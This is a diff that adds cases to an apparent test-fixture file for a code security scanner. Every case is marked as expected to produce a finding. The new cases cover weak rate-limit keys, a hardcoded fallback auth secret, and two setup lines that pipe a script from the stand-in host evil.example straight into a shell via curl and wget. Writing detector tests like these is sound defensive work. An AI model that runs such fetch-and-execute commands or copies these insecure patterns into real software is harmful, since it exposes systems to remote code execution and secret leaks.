@@ -103,5 +103,30 @@
     "name": "preview_open_invoices",
     "expect": "finding",
     "body": "export async function GET() {\n  const rows = await db.invoice.findMany()\n  return Response.json(rows)\n}\n"
+  },
+  {
+    "name": "rate_limit_template",
+    "expect": "finding",
+    "body": "const key = `${ip}|${email}`\nawait limiter.consume(key)\n"
+  },
+  {
+    "name": "rate_limit_fstring",
+    "expect": "finding",
+    "body": "key = f\"{ip}|{email}\"\nlimiter.consume(key)\n"
+  },
+  {
+    "name": "secret_unrelated_dev",
+    "expect": "finding",
+    "body": "const authSecret = process.env.AUTH_SECRET || \"dev-secret\"\nif (process.env.NODE_ENV === \"development\") {}\n"
+  },
+  {
+    "name": "setup_unpinned",
+    "expect": "finding",
+    "body": "curl -fsSL https://evil.example/x.sh | bash\n"
+  },
+  {
+    "name": "setup_wget",
+    "expect": "finding",
+    "body": "wget -qO- https://evil.example/x.sh | sh\n"
   }
 ]
